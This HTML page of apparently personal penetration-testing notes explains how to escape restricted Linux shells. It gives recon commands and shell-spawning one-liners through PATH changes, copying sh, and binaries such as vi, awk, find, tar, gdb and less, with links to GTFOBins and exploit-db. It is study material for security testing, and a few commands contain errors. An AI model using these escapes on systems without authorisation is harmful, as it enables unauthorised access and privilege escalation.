<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Escape Restricted Shells</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Priv-Esc - Linux - Escaping Restricted Shells</h1></strong><br />Oh noes! You&#39;re in a restricted shell. (actual oh noes, you won&#39;t be able to do much if you are)<br />Have a look at the ‘Upgrading shells’ section for ways of escaping.<br />Also have a look here for ways that you can manipulate the binaries that are available to you: <br /><br /><strong>Links</strong><br />• <a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells</a><br />• <a href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=6">https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=6</a> - Describes the process of escaping well<br />• <a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf">https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf</a> - Good<br />• <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> - Check for any binaries your restricted shell can run that you can manipulate<br /><br /><strong><h2>## Reconnaissance</h2></strong><br />The first step when in a restricted shell is to do some reconnaissance.<br /><br />Run <code>env</code> to see exported environment variables<br /><code>echo $PATH</code> to find out what the PATH&#39;s set to<br /><code>echo $SHELL</code> to learn what your shell is (usually rbash or rksh)<br />Try basic unix commands to see what&#39;s allowed - <code>ls</code> <code>pwd</code> <code>cd ..</code> <code>env</code> <code>set</code> <code>export</code> <code>vi</code> <code>cp</code> <code>mv</code> etc.<br /><br /><strong><h2>## Quick wins</h2></strong><br /><strong><h3>### /</h3></strong><br />If / is allowed in commands, you win! <br />Just run <code>/bin/sh</code><br /><br /><strong><h3>### PATH or SHELL</h3></strong><br />If you can set <code>PATH</code> or <code>SHELL</code> variables, you also win!<br />Add binaries to your path - <code>export PATH=/bin:/usr/bin:$PATH<br /></code>Set shell to normal shell - <code>export SHELL=/bin/sh</code><br /><br /><strong><h3>### cp to PATH</h3></strong><br />If you can copy files to your current path, you win again.<br /><br />For example,<br />your PATH is <code>/usr/bin/restricted/</code><br />Copy <code>sh</code> into your bin PATH - <code>cp /bin/sh /usr/bin/restricted/</code><br />Start shell - <code>sh</code><br /><br /><strong><h2>## Commands that let you start shells</h2></strong><br />Here you&#39;re living off the land - making use of the commands available to you to start shells.<br />For more, check here:<br /><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a><br /><br /><strong><h3>### ftp </h3></strong><br /><code>!/bin/sh</code><br /><br /><strong><h3>### gdb </h3></strong><br /><code>!/bin/sh</code><br /><br /><strong><h3>### more / less / man </h3></strong><br /><code>!/bin/sh</code><br /><br /><strong><h3>### vi /vim </h3></strong><br /><code>:!/bin/sh</code><br /><br /><strong><h3>### scp</h3></strong><br /><code>scp -S /tmp/getMeOut.sh x y:</code><br /><br /><strong><h3>### awk </h3></strong><br /><code>awk ‘BEGIN {system(&quot;/bin/sh&quot;)}’</code><br /><br /><strong><h3>### find</h3></strong><br /><code>find / -nbame someName -exec /bin/sh \;</code><br /><br /><strong><h3>### echo</h3></strong><br />If you have echo available, this can work:<br /><code>echo os.system(&quot;/bin/bash&quot;)</code><br /><br /><strong><h3>### tar</h3></strong><br /><code>tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash</code><br /><br /></div>
</body>
</html>
